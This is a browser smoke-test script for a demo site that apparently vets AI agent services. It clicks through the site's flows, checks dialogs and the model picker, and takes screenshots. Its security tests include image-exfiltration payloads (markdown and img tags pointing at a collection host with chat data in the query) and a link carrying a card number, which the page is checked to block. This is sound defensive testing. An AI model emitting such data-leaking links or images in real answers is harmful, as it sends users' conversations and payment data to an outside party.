// smoke.mjs: open the running site in headless Edge or Chrome, click through the main
// flows, record JavaScript errors and take screenshots. Uses the browser's DevTools
// protocol (tools/cdp.mjs). No dependencies.
//
//   node tools/smoke.mjs [--url http://127.0.0.1:8080/] [--out ./screenshots] [--browser <path>]
//
// Serve the site and the range first (see README). Exits 1 on any page error.

import { mkdir, writeFile } from "node:fs/promises";
import path from "node:path";
import { findBrowser, openBrowser, sleep } from "./cdp.mjs";

const args = process.argv.slice(2);
const opt = (name, fallback) => { const i = args.indexOf(name); return i >= 0 ? args[i + 1] : fallback; };
const URL_ = opt("--url", "http://127.0.0.1:8080/");
const OUT = path.resolve(opt("--out", "screenshots"));
const browserPath = findBrowser(opt("--browser", ""));
if (!browserPath) { console.error("No Edge or Chrome found. Pass --browser <path>."); process.exit(2); }

await mkdir(OUT, { recursive: true });
const { send, evaluate, waitFor, close, problems } = await openBrowser({ browserPath, port: 9333 });
const shot = async (name, { full = true } = {}) => {
  let params = { format: "png" };
  if (full) {
    // Scroll-in animations only run while scrolling, so a full-page capture would show
    // them unplayed. Reduced motion shows everything (and checks that fallback).
    await send("Emulation.setEmulatedMedia", { features: [{ name: "prefers-reduced-motion", value: "reduce" }] });
    await sleep(300);
    const m = await send("Page.getLayoutMetrics");
    const { width, height } = m.cssContentSize || m.contentSize;
    params = { ...params, captureBeyondViewport: true, clip: { x: 0, y: 0, width, height: Math.min(height, 12000), scale: 1 } };
  }
  const { data } = await send("Page.captureScreenshot", params);
  if (full) await send("Emulation.setEmulatedMedia", { features: [{ name: "prefers-reduced-motion", value: "no-preference" }] });
  await writeFile(path.join(OUT, `${name}.png`), Buffer.from(data, "base64"));
  console.log(`  screenshot ${name}.png`);
};
const viewport = (width, height, mobile = false) => send("Emulation.setDeviceMetricsOverride", { width, height, deviceScaleFactor: 1, mobile });
const noSideScroll = async (label) => {
  const r = await evaluate("({sw: document.documentElement.scrollWidth, iw: window.innerWidth})");
  if (r.sw > r.iw + 1) problems.push(`${label}: page scrolls sideways (${r.sw}px content in ${r.iw}px)`);
};

try {
  await viewport(1366, 900);
  console.log(`Opening ${URL_} in ${path.basename(browserPath)}`);
  await send("Page.navigate", { url: URL_ });
  await waitFor("document.readyState === 'complete' && document.querySelectorAll('#examples button').length > 0");
  await waitFor("!/Connecting the officer/.test(document.querySelector('#assistant-status').textContent)");
  console.log("  assistant status:", await evaluate("document.querySelector('#assistant-status').textContent"));
  await shot("01-home");

  const inspect = async (label) => {
    await evaluate(`[...document.querySelectorAll('#examples button')].find(b => b.textContent.startsWith(${JSON.stringify(label)})).click()`);
    await waitFor(`!document.querySelector('#report').hidden && document.querySelector('#report-title') && document.querySelector('#inspect-button').textContent === 'Inspect a network'`);
    await sleep(500);
    return evaluate("({stamp: document.querySelector('.stamp strong')?.textContent, findings: document.querySelectorAll('.finding').length, summary: document.querySelector('.report-summary')?.textContent})");
  };
  for (const [label, file, expected] of [
    ["Shady Pizza", "02-shady-pizza", "Entry denied"],
    ["Bank look-alike", "03-bank-lookalike", "Entry denied"],
    ["Loop Maze", "04-loop-maze", "Held for review"],
    ["Sunny Bakery", "05-sunny-bakery", "Cleared"],
  ]) {
    const r = await inspect(label);
    console.log(`  ${label}: ${r.stamp} · ${r.findings} finding(s) · ${r.summary}`);
    if (r.stamp !== expected) problems.push(`${label}: expected "${expected}", got "${r.stamp}"`);
    await evaluate("document.querySelector('#report-section').scrollIntoView()");
    const box = await evaluate("(() => { const r = document.querySelector('#report').getBoundingClientRect(); return {x: r.left + scrollX, y: r.top + scrollY, w: r.width, h: r.height}; })()");
    const { data } = await send("Page.captureScreenshot", { format: "png", captureBeyondViewport: true, clip: { x: box.x, y: box.y, width: box.w, height: Math.min(box.h, 5000), scale: 1 } });
    await writeFile(path.join(OUT, `${file}.png`), Buffer.from(data, "base64"));
    console.log(`  screenshot ${file}.png`);
  }

  // Sunny Bakery has a signed stamp (receipts/), and it fits the version just inspected.
  const stamp = await waitFor("document.querySelector('.receipt-line') && !document.querySelector('.receipt-line').hidden", 8000)
    .then(() => evaluate("({ state: document.querySelector('.receipt-line').dataset.state, text: document.querySelector('.receipt-line').textContent })"))
    .catch(() => ({ state: "missing", text: "" }));
  console.log(`  signed stamp: ${stamp.state} · ${stamp.text}`);
  if (stamp.state !== "ok" || !/Signed stamp verified: Cleared/.test(stamp.text)) problems.push(`signed stamp: ${JSON.stringify(stamp)}`);

  // Approve the bakery, then compare it with the rug-pulled version.
  await evaluate("[...document.querySelectorAll('.report-actions button')].find(b => /Approve/.test(b.textContent))?.click()");
  await waitFor("document.querySelectorAll('#pins-list li .ptitle').length > 0");
  await waitFor("[...document.querySelectorAll('.report-actions button')].some((b) => b.textContent === 'Forget approval')");
  const approved = await evaluate(`({
    identity: [...document.querySelectorAll('#report .light')].find((l) => /Identity/.test(l.textContent))?.querySelector('.value')?.textContent,
    notice: document.querySelector('.report-actions .toast')?.textContent || "",
  })`);
  console.log(`  after approving: ${approved.identity} · "${approved.notice}"`);
  if (approved.identity !== "Matches your approval" || !/^Approved/.test(approved.notice)) problems.push(`after approving the bakery: identity "${approved.identity}", message "${approved.notice}"`);
  // Dialogs: answer one, then report what it asked and what came of it.
  const answerDialog = (start, button, after = "") => evaluate(`(async () => {
    const { desk } = await import(new URL("desk.js", location.href).href);
    const answer = (${start})();
    await new Promise((r) => setTimeout(r, 300));
    const dialog = document.querySelector("dialog.customs-review");
    const title = dialog?.querySelector("h2")?.textContent || "";
    [...(dialog?.querySelectorAll("button") || [])].find((b) => b.textContent === ${JSON.stringify(button)})?.click();
    const result = await answer;
    return { title, result, ${after} };
  })()`);
  // When the officer asks to forget an approval, the visitor is asked first. Say no.
  const asked = await answerDialog("() => desk.unpin(desk.latest.target.url, { askFirst: true })", "Keep it", "kept: !!desk.pins.get(desk.latest.target.url)");
  console.log(`  officer asks to forget: "${asked.title}" · ${asked.result.ok ? "forgotten" : "kept"}`);
  if (!/^Forget your approval/.test(asked.title) || asked.result.ok !== false || !asked.kept) problems.push(`the officer's request to forget an approval was not put to the visitor: ${JSON.stringify(asked)}`);
  await evaluate("document.querySelector('#tab-approvals').click(); document.querySelector('#workspace').scrollIntoView()");
  await sleep(300);
  await shot("06a-approvals", { full: false });
  await evaluate("document.querySelector('#tab-officer').click(); document.querySelector('#workspace').scrollIntoView()");
  await sleep(400);
  await shot("06b-officer", { full: false });
  await evaluate("document.querySelector('#tab-compare').click(); document.querySelector('#compare-demo').click()");
  await waitFor("document.querySelectorAll('#compare-result .changes li').length > 0");
  console.log("  compare:", await evaluate("[...document.querySelectorAll('#compare-result .changes li strong')].map(s => s.textContent).join(' | ')"));
  // The guard's dialog for a held partner (the rug-pulled bakery): turn it away.
  const held = await answerDialog(`async () => { const { confirmEntryDialog } = await import(new URL("customs/guard-ui.js", location.href).href);
    return confirmEntryDialog(desk.comparison.after); }`, "Turn it away");
  console.log(`  guard asks: "${held.title}" · ${held.result ? "let in" : "turned away"}`);
  if (!/^Let /.test(held.title) || held.result !== false) problems.push(`the guard's review dialog did not work: ${JSON.stringify(held)}`);
  // The model picker: choosing another provider shows its models and empties the key field.
  const picked = await evaluate(`(() => {
    const key = document.querySelector("#mp-key");
    key.value = "a key typed for another provider";
    document.querySelector('#mp-cards input[value="claude"]').click();
    return { cards: document.querySelectorAll("#mp-cards .mp-card").length, keyCleared: key.value === "",
      model: document.querySelector("#mp-model").selectedOptions[0]?.textContent || "", link: document.querySelector("#mp-key-link").href };
  })()`);
  console.log(`  model picker: ${picked.cards} cards · Claude shows "${picked.model}" · key field ${picked.keyCleared ? "emptied" : "kept"}`);
  if (picked.cards !== 6 || !picked.keyCleared || !/Claude/.test(picked.model) || !/anthropic/.test(picked.link)) problems.push(`model picker: ${JSON.stringify(picked)}`);
  // One box for every key: no advanced link, and the runtime's own form never shows. "Other
  // service" takes an address and a model name and passes them to the runtime's form. The
  // runtime's Save is stubbed here, so nothing is saved or sent.
  const other = await evaluate(`(async () => {
    const shown = (sel) => { const el = document.querySelector(sel); return !!el && !el.hidden && getComputedStyle(el).display !== "none"; };
    document.querySelector('#mp-cards input[value="other"]').click();
    const card = { address: shown("#mp-router-row"), keyPage: shown("#mp-key-link"), keyHint: shown("#mp-key-other") };
    const router = document.querySelector("#mp-router");
    router.value = "https://ai.invalid/v1";
    router.dispatchEvent(new Event("change"));
    document.querySelector("#mp-model-other").value = "test-model";
    document.querySelector("#mp-key").value = "test-key-not-real";
    let applied = false;
    document.querySelector("#ns-apply").click = () => { applied = true; };
    document.querySelector("#mp-start").click();
    // The picker first asks the made-up address for its models; that lookup can take a while to fail.
    for (let waited = 0; !applied && waited < 12000; waited += 250) await new Promise((r) => setTimeout(r, 250));
    const form = { router: document.querySelector("#ns-router")?.value, model: document.querySelector("#ns-model")?.value, name: document.querySelector("#ns-profile-name")?.value, applied };
    try { sessionStorage.removeItem("agent-customs-after-save"); history.scrollRestoration = "auto"; } catch {}
    document.querySelector('#mp-cards input[value="gemini"]').click();
    return { card, form, advancedLink: !!document.querySelector("#mp-advanced"),
      runtimeFormShown: shown('#agent-app [data-ns-slot="settings"]'), backToGemini: { address: shown("#mp-router-row"), keyPage: shown("#mp-key-link") } };
  })()`);
  console.log(`  other service: ${JSON.stringify(other)}`);
  // The picker asked the made-up address for its models; that address never resolves, by design.
  for (let i = problems.length - 1; i >= 0; i -= 1) if (problems[i].includes("https://ai.invalid/")) problems.splice(i, 1);
  if (!other.card.address || other.card.keyPage || !other.card.keyHint || other.advancedLink || other.runtimeFormShown
    || other.form.router !== "https://ai.invalid/v1" || other.form.model !== "test-model" || other.form.name !== "ai.invalid" || !other.form.applied
    || other.backToGemini.address || !other.backToGemini.keyPage) problems.push(`one key box / other service: ${JSON.stringify(other)}`);
  // A key for a service the runtime knows but no card shows (Otari, the kit's default)
  // selects "Other" with that service's address and default model. The model list request
  // is answered here, so nothing reaches Otari.
  const otari = await evaluate(`(async () => {
    const realFetch = window.fetch;
    const router = document.querySelector("#mp-router");
    const before = router.value;
    window.fetch = async () => new Response(JSON.stringify({ data: [{ id: "alibaba/qwen3.8-flash" }] }), { status: 200, headers: { "Content-Type": "application/json" } });
    try {
      document.querySelector('#mp-cards input[value="gemini"]').click();
      const key = document.querySelector("#mp-key");
      key.value = "otk_" + "x".repeat(24);
      key.dispatchEvent(new Event("input"));
      await new Promise((r) => setTimeout(r, 900));
      return { card: document.querySelector("#mp-cards input:checked")?.value, router: router.value,
        model: document.querySelector("#mp-model").value || document.querySelector("#mp-model-other").value,
        status: document.querySelector("#mp-status").textContent };
    } finally {
      window.fetch = realFetch;
      document.querySelector("#mp-key").value = "";
      router.value = before;
      document.querySelector('#mp-cards input[value="gemini"]').click();
    }
  })()`);
  console.log(`  otari key: ${JSON.stringify(otari)}`);
  // Lock 3: no answer can load a remote image. The runtime's renderers turn image markup into
  // text or links, and the page's policy refuses remote images anyway. The image addresses use
  // the reserved .invalid domain, so nothing is ever fetched.
  const images = await evaluate(`(async () => {
    const { renderMarkdown, renderSafeHtml } = await import(new URL("runtime/cruse-render.js", location.href).href);
    const md = document.createElement("div");
    renderMarkdown(md, "Here: ![x](https://collect.invalid/p.png?q=chat) and <img src=https://collect.invalid/a.png>");
    const html = document.createElement("div");
    renderSafeHtml(html, '<p>Hi<img src="https://collect.invalid/b.png"></p>');
    const refused = await new Promise((resolve) => {
      const onViolation = (e) => { if (e.violatedDirective.startsWith("img-src")) done(true); };
      const done = (value) => { document.removeEventListener("securitypolicyviolation", onViolation); resolve(value); };
      document.addEventListener("securitypolicyviolation", onViolation);
      new Image().src = "https://collect.invalid/c.png";
      setTimeout(() => done(false), 1500);
    });
    return { markdownImages: md.querySelectorAll("img").length, htmlImages: html.querySelectorAll("img").length, refusedByPolicy: refused };
  })()`);
  console.log(`  remote images: ${JSON.stringify(images)}`);
  for (let i = problems.length - 1; i >= 0; i -= 1) if (problems[i].includes("collect.invalid")) problems.splice(i, 1);
  if (images.markdownImages || images.htmlImages || !images.refusedByPolicy) problems.push(`remote images: ${JSON.stringify(images)}`);
  // Lock 1: the page never follows a link that carries a real card number, and says so.
  const linkLock = await evaluate(`(async () => {
    const link = document.createElement("a");
    link.href = "https://collect.invalid/pay?c=4242424242424242";
    link.textContent = "pay";
    (document.querySelector("#ns-msgs") || document.body).append(link);
    const followed = link.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
    await new Promise((r) => setTimeout(r, 400));
    const notice = document.querySelector('.customs-notice[data-lock="card number"]');
    const result = { followed, notice: notice ? notice.querySelector("p")?.textContent : null };
    link.remove();
    document.querySelectorAll(".customs-notice[data-lock]").forEach((n) => n.remove());
    return result;
  })()`);
  console.log(`  card-number link: ${JSON.stringify(linkLock)}`);
  if (linkLock.followed || !/Kept a card number out of a link to collect\.invalid/.test(linkLock.notice || "")) problems.push(`card-number link: ${JSON.stringify(linkLock)}`);
  if (otari.card !== "other" || otari.router !== "https://api.otari.ai/api/v1" || otari.model !== "alibaba/qwen3.8-flash" || /did not accept/.test(otari.status)) {
    problems.push(`otari key: ${JSON.stringify(otari)}`);
  }
  await evaluate("document.querySelector('#workspace').scrollIntoView()");
  await sleep(300);
  const desk = await evaluate("(() => { const r = document.querySelector('#workspace').getBoundingClientRect(); return {x: r.left + scrollX, y: r.top + scrollY, w: r.width, h: r.height}; })()");
  const { data: deskShot } = await send("Page.captureScreenshot", { format: "png", captureBeyondViewport: true, clip: { x: desk.x, y: desk.y, width: desk.w, height: desk.h, scale: 1 } });
  await writeFile(path.join(OUT, "06-approvals-and-compare.png"), Buffer.from(deskShot, "base64"));
  console.log("  screenshot 06-approvals-and-compare.png");

  // Close-ups of each section at real size.
  await send("Emulation.setEmulatedMedia", { features: [{ name: "prefers-reduced-motion", value: "reduce" }] });
  for (const id of ["hidden", "workspace", "how", "guard"]) {
    await evaluate(`document.getElementById(${JSON.stringify(id)}).scrollIntoView({block: "start"}); scrollBy(0, -90)`);
    await sleep(350);
    await shot(`section-${id}`, { full: false });
  }
  // The closing section, at rest.
  await evaluate("document.querySelector('footer.closing').scrollIntoView({block: 'start'})");
  await sleep(300);
  await shot("section-closing", { full: false });
  // The hidden sentence half lit: motion on, the section's top half way up the screen.
  await send("Emulation.setEmulatedMedia", { features: [{ name: "prefers-reduced-motion", value: "no-preference" }] });
  await evaluate("scrollTo(0, document.getElementById('hidden').offsetTop - innerHeight * 0.55)");
  await sleep(500);
  await shot("moment-mid-scrub", { full: false });
  await send("Emulation.setEmulatedMedia", { features: [{ name: "prefers-reduced-motion", value: "reduce" }] });
  // Each palette: the hero and the light band.
  for (const palette of ["forest", "terracotta", "navy", "espresso"]) {
    await evaluate(`document.querySelector('.palette-picker button[data-palette="${palette}"]')?.click()`);
    await evaluate("scrollTo(0, 0)");
    await sleep(350);
    await shot(`palette-${palette}-top`, { full: false });
    await evaluate("document.getElementById('how').scrollIntoView({block: 'start'}); scrollBy(0, -40)");
    await sleep(350);
    await shot(`palette-${palette}-band`, { full: false });
  }
  await evaluate(`document.querySelector('.palette-picker button[data-palette="forest"]')?.click()`);
  await send("Emulation.setEmulatedMedia", { features: [{ name: "prefers-reduced-motion", value: "no-preference" }] });
  await noSideScroll("desktop");
  await send("Emulation.setEmulatedMedia", { features: [{ name: "prefers-color-scheme", value: "dark" }] });
  await evaluate("scrollTo(0, 0)");
  await sleep(300);
  await shot("07-dark-top", { full: false });
  await inspect("Shady Pizza");
  await evaluate("document.querySelector('#report-section').scrollIntoView()");
  await sleep(300);
  await shot("08-dark-report", { full: false });
  await send("Emulation.setEmulatedMedia", { features: [{ name: "prefers-color-scheme", value: "light" }] });
  await viewport(390, 844, true);
  await sleep(400);
  await noSideScroll("phone");
  await evaluate("scrollTo(0, 0)");
  await sleep(200);
  await shot("09-phone-top", { full: false });
  await evaluate("document.querySelector('#report-section').scrollIntoView()");
  await sleep(300);
  await shot("10-phone-report", { full: false });
  await evaluate("document.querySelector('#tab-compare').click(); document.querySelector('#workspace').scrollIntoView()");
  await sleep(300);
  await noSideScroll("phone compare");
  await shot("11-phone-compare", { full: false });
} catch (error) {
  problems.push(`smoke step failed: ${error.message}`);
} finally {
  close();
}

// The made-up addresses (.invalid) never resolve, by design; a late failed lookup is not a problem.
for (let i = problems.length - 1; i >= 0; i -= 1) if (/https:\/\/(?:ai|collect)\.invalid\//.test(problems[i])) problems.splice(i, 1);

if (problems.length) {
  console.log("\nProblems:");
  for (const p of problems) console.log(`  - ${p}`);
  process.exitCode = 1;
} else {
  console.log("\nNo page errors.");
}
